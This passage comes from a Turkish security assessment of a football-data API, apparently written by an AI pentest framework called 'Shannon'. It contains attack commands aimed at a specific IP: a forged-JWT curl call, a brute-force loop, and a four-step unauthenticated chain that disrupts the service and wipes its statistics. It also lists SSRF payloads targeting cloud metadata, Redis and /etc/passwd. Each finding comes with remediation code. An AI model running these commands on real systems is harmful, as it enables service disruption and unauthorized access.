        'exp': time.time() + 31536000,  # 1 yıl
        'iat': time.time()
    },
    JWT_SECRET,
    algorithm='HS256'
)

# Bu token tüm auth-gerektiren endpoint'lerde geçerli
# curl -H "Authorization: Bearer <fake_token>" http://72.61.105.107:8000/...
```

### Etki

- Saldırgan sınırsız sayıda geçerli token üretebilir
- Token süresi istediği kadar uzun olabilir (1 yıl, 10 yıl...)
- `user_id` istediği değer olabilir
- Tüm authenticated endpoint'lere erişim sağlanır
- Secret key değiştirilmedikçe sahte token'lar geçerli kalır

### Düzeltme

1. **Hemen:** JWT_SECRET_KEY'i yenile
2. **Kısa vade:** RS256 (asimetrik) imzalamaya geç - public key ile doğrulama, private key ile imzalama
3. **Orta vade:** Token'lara `jti` (unique ID) claim ekle, Redis'te blacklist tut

---

## 22. ORTA - Token Endpoint'te Rate Limit Yok (Brute-Force)

**CVSS:** 5.9 (Medium)
**CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)
**Shannon Bulgu ID:** AUTH-VULN-04
**Dosya:** `security.py` satır 276-278, `routes/auth.py`

### Sorun

`POST /api/v1/auth/token` endpoint'inde rate limiting yok. Saldırgan sınırsız sayıda API key denemesi yapabilir.

### Shannon'ın Tespiti

```
AdvancedRateLimit sınıfı mevcut (security.py:80-108):
  - 60 istek/saat default limiti var
  - AMA TAMAMEN DEVRE DIŞI (satır 276-278 comment-out)

IP spoofing ile bypass da mümkün:
  - X-Forwarded-For header'ı doğrulanmadan kabul ediliyor
  - Her sahte IP için ayrı rate limit sayacı
```

### Saldırı

```bash
# Sınırsız brute-force denemesi
for key in $(cat api_key_wordlist.txt); do
  curl -s -X POST http://72.61.105.107:8000/api/v1/auth/token \
    -H "Content-Type: application/json" \
    -d "{\"api_key\": \"$key\"}" &
done
```

### Düzeltme

```python
from flask_limiter import Limiter

@auth_bp.route('/token', methods=['POST'])
@limiter.limit("10 per minute")        # Dakikada 10 deneme
@limiter.limit("50 per hour")          # Saatte 50 deneme
def generate_token():
    ...
```

---

## 23. ORTA - Token İptal Mekanizması Yok

**CVSS:** 5.4 (Medium)
**CWE:** CWE-613 (Insufficient Session Expiration)
**Shannon Bulgu ID:** AUTH-VULN-05

### Sorun

JWT token'lar oluşturulduktan sonra iptal edilemiyor. Logout endpoint'i yok, token blacklist'i yok. Çalınan token 1 saat boyunca geçerli kalır.

### Shannon'ın Detaylı Tespiti

- `/api/v1/auth/logout` endpoint'i **mevcut değil**
- JWT payload'ında `jti` (JWT ID) claim'i **yok** → token'lar takip edilemiyor
- Redis'te token blacklist **yok**
- Yeni token alınsa bile eski token **hala geçerli** (concurrent sessions)
- Tek çözüm JWT_SECRET_KEY'i değiştirmek → ama bu **tüm** kullanıcıların token'larını geçersiz kılar

### Saldırı Senaryosu

```
1. Saldırgan JWT token çalar (MITM, log dosyası, XSS)
   ↓
2. Kullanıcı durumu fark eder, yeni token alır
   ↓
3. Eski token HALA GEÇERLİ (1 saat boyunca)
   ↓
4. Saldırgan eski token ile admin işlemleri yapar
   ↓
5. İptal etmenin yolu yok!
```

### Düzeltme

```python
# Redis-based token blacklist
import redis
token_blacklist = redis.Redis(host='localhost', port=6379, db=1)

def revoke_token(jti):
    """Token'ı blacklist'e ekle"""
    token_blacklist.setex(f"revoked:{jti}", 3600, "true")

def is_token_revoked(jti):
    """Token blacklist'te mi kontrol et"""
    return token_blacklist.exists(f"revoked:{jti}")

# require_auth decorator'ına ekle:
jti = payload.get('jti')
if jti and is_token_revoked(jti):
    return jsonify({'error': 'Token revoked'}), 401
```

---

## 24. ORTA - Auth Response Cache-Control Eksik

**CVSS:** 4.3 (Medium)
**CWE:** CWE-525 (Use of Web Browser Cache Containing Sensitive Information)
**Shannon Bulgu ID:** AUTH-VULN-07

### Sorun

`/api/v1/auth/token` endpoint'inin yanıtında `Cache-Control: no-store` header'ı yok. Tarayıcılar ve proxy'ler JWT token içeren yanıtları cache'leyebilir.

### Etki

- Paylaşılan bilgisayarda tarayıcı cache'inden token çalınabilir
- CDN/Proxy'ler auth yanıtlarını cache'leyip farklı kullanıcılara sunabilir
- OWASP bu durumu güvenlik açığı olarak sınıflandırıyor

### Mevcut Header'lar

```
X-Content-Type-Options: nosniff     ✅ var
X-Frame-Options: DENY               ✅ var
Strict-Transport-Security: ...       ✅ var (ama HTTP'de etkisiz)
Cache-Control: no-store              ❌ YOK
Pragma: no-cache                     ❌ YOK
```

### Düzeltme

```python
@auth_bp.route('/token', methods=['POST'])
def generate_token():
    response = jsonify({...})
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, private'
    response.headers['Pragma'] = 'no-cache'
    return response
```

---

## 25. DÜŞÜK - JWT Token'da Unique ID (jti) Yok

**CVSS:** 3.1 (Low)
**CWE:** CWE-294 (Authentication Bypass by Capture-replay)
**Shannon Bulgu ID:** AUTH-VULN-08

### Sorun

JWT token'larda `jti` (JWT ID) claim'i yok. Aynı saniyede aynı kullanıcı için oluşturulan token'lar birbirinin aynısı oluyor. Token replay saldırısı tespit edilemiyor.

### Mevcut JWT Payload

```json
{
  "user_id": "admin",
  "exp": 1740456000,
  "iat": 1740452400
}
// jti YOK → token unique değil, replay tespit edilemez
```

### Olması Gereken

```json
{
  "user_id": "admin",
  "exp": 1740456000,
  "iat": 1740452400,
  "jti": "550e8400-e29b-41d4-a716-446655440000"  // Unique ID
}
```

### Düzeltme

```python
import uuid

def generate_api_token(user_id, expires_in=3600):
    payload = {
        'user_id': user_id,
        'jti': str(uuid.uuid4()),  # Unique token ID
        'exp': time.time() + expires_in,
        'iat': time.time()
    }
    return jwt.encode(payload, JWT_SECRET_KEY, algorithm='HS256')
```

---

## 26. DÜŞÜK - Content-Security-Policy (CSP) Header Eksik

**CVSS:** 3.0 (Low)
**CWE:** CWE-1021 (Improper Restriction of Rendered UI Layers)
**Shannon Bulgusu:** XSS Analysis Deliverable

### Sorun

API yanıtlarında `Content-Security-Policy` header'ı gönderilmiyor. API JSON döndüğü için doğrudan XSS riski olmasa da, CSP olmadan client uygulamalar korumasız kalır.

### Mevcut Security Header'lar

```
X-Content-Type-Options: nosniff        ✅ var
X-Frame-Options: DENY                  ✅ var
X-XSS-Protection: 1; mode=block        ✅ var
Strict-Transport-Security: ...         ✅ var (HTTP'de etkisiz)
Content-Security-Policy: ...           ❌ YOK
Referrer-Policy: ...                   ❌ YOK
Permissions-Policy: ...                ❌ YOK
```

### Düzeltme

```python
@app.after_request
def add_security_headers(response):
    response.headers['Content-Security-Policy'] = "default-src 'none'; frame-ancestors 'none'"
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    response.headers['Permissions-Policy'] = 'geolocation=(), camera=(), microphone=()'
    return response
```

---

## 27. DÜŞÜK - Upstream Veriler Sanitize Edilmemiş

**CVSS:** 3.7 (Low)
**CWE:** CWE-79 (Stored XSS via Data Relay)
**Shannon Bulgusu:** XSS Analysis Deliverable - Section 4.1

### Sorun

API, NowGoal/Goaloo'dan scrape ettiği verileri **hiçbir sanitizasyon yapmadan** doğrudan döndürüyor. Takım adları, oyuncu isimleri, maç açıklamaları olduğu gibi cache'lenip servis ediliyor.

### Saldırı Senaryosu

```
1. Saldırgan NowGoal web sitesini ele geçirir
   ↓
2. Takım adını değiştirir: "Real Madrid<script>alert('xss')</script>"
   ↓
3. Golsinyali API bu veriyi scrape eder ve cache'ler
   ↓
4. Client uygulama (golsinyali.com) veriyi HTML'e render eder
   ↓
5. Stored XSS → Tüm kullanıcılar etkilenir
```

### Neden Düşük Seviye?

- API kendisi JSON döndürüyor (direkt XSS yok)
- Saldırı upstream kaynak ele geçirmeye bağlı (zor)
- Asıl risk client tarafında (golsinyali.com'un sorumluluğu)

### Düzeltme

```python
import html

def sanitize_text(text):
    """Upstream veriden gelen metni sanitize et"""
    if not isinstance(text, str):
        return text
    return html.escape(text)

# Parser'larda kullan:
team_name = sanitize_text(raw_team_name)
```

---

## 28. ORTA - Concurrent Token Invalidation Yok

**CVSS:** 4.8 (Medium)
**CWE:** CWE-613 (Insufficient Session Expiration)
**Shannon Bulgu ID:** AUTH-VULN-06

### Sorun

Yeni JWT token oluşturulduğunda eski token'lar geçersiz kılınmıyor. Aynı anda birden fazla token aktif olabiliyor.

### Saldırı Senaryosu

Shannon bu senaryoyu session hijacking testi olarak doğruladı:

```
T=0    → Kullanıcı Token1 alır
T=10   → Saldırgan Token1'i çalar (MITM)
T=30   → Kullanıcı şüphelenir, Token2 alır (güvenlik için)
T=31   → Saldırgan Token1 ile hala erişebilir! ← SORUN
T=3600 → Token1 doğal olarak expire olur (1 saat sonra!)
```

### Düzeltme

Yeni token oluşturulduğunda eskisini Redis blacklist'e ekle:

```python
def generate_api_token(user_id, expires_in=3600):
    # Eski token'ları iptal et
    old_jti = redis_client.get(f"user_active_token:{user_id}")
    if old_jti:
        redis_client.setex(f"revoked:{old_jti}", expires_in, "true")

    # Yeni token oluştur
    jti = str(uuid.uuid4())
    redis_client.setex(f"user_active_token:{user_id}", expires_in, jti)

    payload = {
        'user_id': user_id,
        'jti': jti,
        'exp': time.time() + expires_in,
        'iat': time.time()
    }
    return jwt.encode(payload, JWT_SECRET_KEY, algorithm='HS256')
```

---

## 29. Shannon Zincirleme Saldırı Kanıtı (Combined Attack)

Shannon 4 admin endpoint'i birleştirerek tam bir saldırı zinciri oluşturdu ve **canlı sunucuda çalıştırdı**:

```bash
# Shannon'ın çalıştırdığı zincirleme saldırı (tümü auth olmadan):

# Adım 1: Sağlık metriklerini sıfırla → failover körleşir
curl -X POST http://72.61.105.107:8000/api/v1/sources/reset-metrics

# Adım 2: En yavaş/güvenilmez kaynağı zorla → performans düşer
curl -X POST http://72.61.105.107:8000/api/v1/sources/force-primary \
  -d '{"source_url": "https://www.goaloo.com"}'

# Adım 3: Tüm cache'i temizle → anında etki başlar
curl -X POST http://72.61.105.107:8000/api/v1/cache/clear

# Adım 4: İstatistikleri sıfırla → iz bırakma
curl -X POST http://72.61.105.107:8000/api/v1/cache/stats/reset

# SONUÇ:
# ✗ Uygulama güvenilmez kaynağa zorlandı
# ✗ Failover tetiklenemiyor (metrikler sıfır)
# ✗ Cache yok → her istek upstream'e gidiyor
# ✗ İstatistiklerde iz yok
# ✗ Tam servis bozulması sağlandı
```

Bu saldırı zinciri **sıfır authentication** ile çalışıyor ve **10 saniyede** tamamlanıyor.

---

## 30. Shannon SSRF Exploit Sonucu (Güncelleme)

**Orijinal Seviye:** KRITIK → **Güncelleme:** ORTA (Domain Whitelist Koruması Var)
**Shannon Bulgu ID:** SSRF-VULN-01

### Shannon'ın Canlı Exploit Sonuçları

Shannon 5 farklı SSRF payload'u denedi. Hepsi engellendi:

| Payload | Hedef | Sonuç |
|---------|-------|-------|
| `http://169.254.169.254/latest/meta-data/` | AWS Metadata | ❌ 400 "not in configured sources" |
| `http://127.0.0.1:6379/` | Redis | ❌ 400 "not in configured sources" |
| `http://www.nowgoal.com` (HTTP) | Protokol downgrade | ❌ 400 "not in configured sources" |
| `gopher://127.0.0.1:6379/` | Gopher protokolü | ❌ 400 Engellendi |
| `file:///etc/passwd` | Dosya okuma | ❌ 400 Engellendi |

### Neden Kritik'ten Orta'ya Düştü?

`source_manager.py` bir domain whitelist uyguluyor. Sadece yapılandırılmış kaynaklar (`live4.nowgoal26.com`, `www.nowgoal.com`, `www.goaloo.com`) kabul ediliyor. Bilinmeyen URL'ler reddediliyor.

### Hala Risk Olan Durumlar

1. **Whitelist bypass**: Eğer whitelist'teki bir domain ele geçirilirse SSRF mümkün
2. **DNS rebinding**: `www.nowgoal.com` DNS'i iç IP'ye yönlendirilebilir
3. **Auth olmadan erişim**: Endpoint hala auth istemiyor - sadece URL sınırlı
4. **Veri manipülasyonu**: Whitelist'teki kaynaklar arasında zorla geçiş yapılabilir (bu test sırasında gerçekleşti!)

---

## Güncellenmiş Risk Tablosu (Tüm Bulgular)

| # | Bulgu | Seviye | CVSS | Shannon ID | Durum |
|---|-------|--------|------|------------|-------|
| 1 | Secret'lar git repo'sunda açık | **KRITIK** | 9.8 | AUTH-VULN-01 | Doğrulandı |
| 2 | Admin endpoint'ler auth'suz | **KRITIK** | 9.1 | AUTHZ-VULN-01~04 | **Exploit edildi** |
| 3 | SSRF (force-primary) | **ORTA** | 5.3 | SSRF-VULN-01 | Domain whitelist engelledi |
| 4 | CORS wildcard (*) | **YÜKSEK** | 7.5 | - | Doğrulandı |
| 5 | Tüm veri endpoint'leri auth'suz | **YÜKSEK** | 7.5 | - | Doğrulandı |
| 6 | Redis şifresiz | **YÜKSEK** | 7.2 | - | Kod analizi |
| 7 | Rate limiting devre dışı | **YÜKSEK** | 7.0 | AUTH-VULN-04 | Doğrulandı |
| 8 | HTTP redirect doğrulaması yok | **YÜKSEK** | 7.0 | - | Kod analizi |
| 9 | HTTP plaintext (HTTPS yok) | **YÜKSEK** | 7.4 | AUTH-VULN-03 | **Exploit edildi** |
| 10 | JWT token sahteciliği | **YÜKSEK** | 7.2 | AUTH-VULN-02 | Doğrulandı |
| 11 | IP spoofing rate limit bypass | **ORTA** | 5.3 | - | Doğrulandı |
| 12 | RBAC yok | **ORTA** | 5.4 | - | Doğrulandı |
| 13 | Dependency pinning yok | **ORTA** | 5.0 | - | Kod analizi |
| 14 | Audit log yok | **ORTA** | 4.3 | - | Kod analizi |
| 15 | Token brute-force koruması yok | **ORTA** | 5.9 | AUTH-VULN-04 | Doğrulandı |
| 16 | Token iptal mekanizması yok | **ORTA** | 5.4 | AUTH-VULN-05 | Doğrulandı |
| 17 | Auth response cache-control yok | **ORTA** | 4.3 | AUTH-VULN-07 | Kod analizi |
| 18 | Concurrent token invalidation yok | **ORTA** | 4.8 | AUTH-VULN-06 | Doğrulandı |
| 19 | Bilgi sızıntısı (health/detailed) | **DÜŞÜK** | 3.7 | - | Doğrulandı |
| 20 | HSTS preload eksik | **DÜŞÜK** | 3.0 | - | Doğrulandı |
| 21 | Server header açık | **DÜŞÜK** | 2.6 | - | Doğrulandı |
| 22 | JWT'de jti claim yok | **DÜŞÜK** | 3.1 | AUTH-VULN-08 | Kod analizi |
| 23 | CSP header eksik | **DÜŞÜK** | 3.0 | XSS Analysis | Kod analizi |
| 24 | Upstream veri sanitize edilmemiş | **DÜŞÜK** | 3.7 | XSS Analysis | Kod analizi |

**Toplam:** 24 bulgu (2 kritik, 7 yüksek, 8 orta, 7 düşük)

---

## Güncellenmiş Düzeltme Öncelikleri

### Acil (24 saat içinde)

| # | İşlem | Dosya |
|---|-------|-------|
| 1 | Tüm secret'ları yeniden oluştur | `.env`, AWS Console |
| 2 | AWS key'lerini devre dışı bırak | AWS IAM Console |
| 3 | Admin endpoint'lere `@require_api_key` ekle | `routes/health.py` |
| 4 | `.env`'yi `.gitignore`'a ekle | `.gitignore` |
| 5 | CORS'u `*` yerine domain listesine çevir | `.env` |

### 1 Hafta İçinde

| # | İşlem | Dosya |
|---|-------|-------|
| 6 | HTTPS etkinleştir (Let's Encrypt + Nginx) | Sunucu konfigürasyonu |
| 7 | Redis'e parola ekle | `redis.conf`, `config.py` |
| 8 | Rate limiting'i aktif et | `security.py` |
| 9 | Token endpoint'e rate limit ekle | `routes/auth.py` |
| 10 | JWT_SECRET_KEY yenile | `.env` |
| 11 | Auth response'a Cache-Control ekle | `routes/auth.py` |

### 1 Ay İçinde

| # | İşlem | Dosya |
|---|-------|-------|
| 12 | RBAC (rol tabanlı yetkilendirme) | `security.py` |
| 13 | Token revocation (blacklist) mekanizması | Yeni kod + Redis |
| 14 | JWT'ye jti claim ekle | `security.py` |
| 15 | Concurrent token invalidation | `security.py` |
| 16 | Audit logging ekle | Yeni `audit.py` |
| 17 | IP spoofing koruması (trusted proxy) | `security.py` |
| 18 | Dependency version pinning | `requirements.txt` |
| 19 | HTTP redirect hedeflerini doğrula | `http_client.py` |
| 20 | CSP, Referrer-Policy, Permissions-Policy header'ları | `app.py` |
| 21 | Upstream veri sanitizasyonu | `parsers.py`, `live_parsers.py` |
| 22 | Server header'ı gizle | `gunicorn_config.py` |

---

## Ek: Shannon Pentest Detayları

### Çalıştırılan Aşamalar

| Aşama | Agent | Turn Sayısı | Log Boyutu | Durum |
|-------|-------|-------------|------------|-------|
| Pre-recon | Kod analizi | ~370 | 260 KB | Tamamlandı |
| Recon | Canlı keşif + Playwright | ~391 | 205 KB | Tamamlandı |
| Auth-vuln | Authentication analizi | ~180 | 170 KB | Tamamlandı |
| Authz-vuln | Authorization analizi | 2 deneme | 46+95 KB | Tamamlandı |
| Injection-vuln | Injection analizi | ~252 | 168 KB | Tamamlandı |
| XSS-vuln | XSS analizi | ~100 | 116 KB | Tamamlandı |
| SSRF-vuln | SSRF analizi | ~80 | 124 KB | Tamamlandı |
| SSRF-exploit | SSRF exploit denemeleri | ~80 | 133 KB | Tamamlandı |
| Authz-exploit | Authz exploit denemeleri | ~80 | 151 KB | Tamamlandı |
| Auth-exploit | Auth exploit denemeleri | ~126+ | 182 KB | Devam ediyor |

### Shannon Exploitation Queue (Tam Liste)

| ID | Tip | Endpoint | Güven | Exploit Sonucu |
|----|-----|----------|-------|----------------|
| AUTHZ-VULN-01 | Authorization Bypass | `POST /cache/clear` | High | **EXPLOIT EDİLDİ** - 200 OK auth olmadan |
| AUTHZ-VULN-02 | Authorization Bypass | `POST /cache/stats/reset` | High | **EXPLOIT EDİLDİ** - 200 OK auth olmadan |
| AUTHZ-VULN-03 | Authorization Bypass | `POST /sources/force-primary` | High | **EXPLOIT EDİLDİ** - Source değiştirildi |
| AUTHZ-VULN-04 | Authorization Bypass | `POST /sources/reset-metrics` | High | **EXPLOIT EDİLDİ** - Metrikler sıfırlandı |
| SSRF-VULN-01 | URL Manipulation | `POST /sources/force-primary` | High → Medium | **ENGELLENDİ** - Domain whitelist korudu |
| AUTH-VULN-01 | Credential Exposure | Tüm endpoint'ler | High | Secret'lar repo'da açık |
| AUTH-VULN-02 | Token Forgery | `POST /auth/token` | High | JWT sahtecilik mümkün |
| AUTH-VULN-03 | Transport Exposure | `POST /auth/token` | High | **EXPLOIT EDİLDİ** - Plaintext doğrulandı |
| AUTH-VULN-04 | Brute-Force | `POST /auth/token` | High | Rate limit yok |
| AUTH-VULN-05 | Token Revocation | Tüm auth endpoint'ler | High | Logout/iptal mekanizması yok |
| AUTH-VULN-06 | Concurrent Sessions | `POST /auth/token` | Medium | Eski token yeni token'dan sonra da geçerli |
| AUTH-VULN-07 | Cache-Control | `POST /auth/token` | Medium | Auth yanıtı cache'lenebilir |
| AUTH-VULN-08 | Token Replay | `POST /auth/token` | Medium | jti claim yok, replay tespit edilemez |
| XSS | - | - | - | **TEMİZ** (0 açık) |
| Injection | - | - | - | **TEMİZ** (0 açık) |

---

*Bu rapor Shannon AI Penetration Testing Framework v1.0.0 ve manuel güvenlik testleri kullanılarak 2026-02-25 tarihinde hazırlanmıştır. Shannon ~1.5 saat çalışmış, 11 agent ile 1500+ turn tamamlanmış, 16 deliverable dosyası üretilmiştir. Tüm bulgular bu rapora dahil edilmiştir.*
